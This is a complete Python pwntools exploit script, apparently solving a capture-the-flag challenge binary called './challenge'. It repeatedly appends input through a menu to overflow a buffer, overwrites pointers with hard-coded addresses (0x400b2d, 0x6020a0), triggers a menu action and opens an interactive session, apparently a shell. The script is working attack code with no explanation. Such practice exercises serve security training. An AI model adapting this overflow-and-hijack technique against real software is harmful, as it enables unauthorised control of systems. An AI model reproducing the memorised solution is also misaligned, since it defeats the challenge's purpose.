#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = './challenge'
elf = ELF(binary)
libc = elf.libc

io = process(binary, aslr = 0)
context.arch = elf.arch

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000

def menu(idx):
    io.recvuntil('> ')
    io.sendline(str(idx))

def long_append():
    menu(2)
    io.recvuntil("Give me ")
    sz = int(io.recvuntil(" chars", drop = True))
    io.send(p64(0x400b2d)[:3] + 'a' * (sz - 3))
    return sz

def short_append(now, limit):
    menu(1)
    io.recvuntil("Give me ")
    sz = int(io.recvuntil(" chars", drop = True))
    if sz + now >= limit:
        io.send((limit - now) * 'a')
    else:
        io.send('a' * sz)
    return sz


count = long_append()
while count <= 1024:
    tmp = short_append(count, 1024)
    count += tmp
    print(count)

menu(1)
io.recvuntil(":")
io.send(p64(0x6020a0))

menu(4)
io.recvuntil("?")
io.sendline('3')



io.interactive()
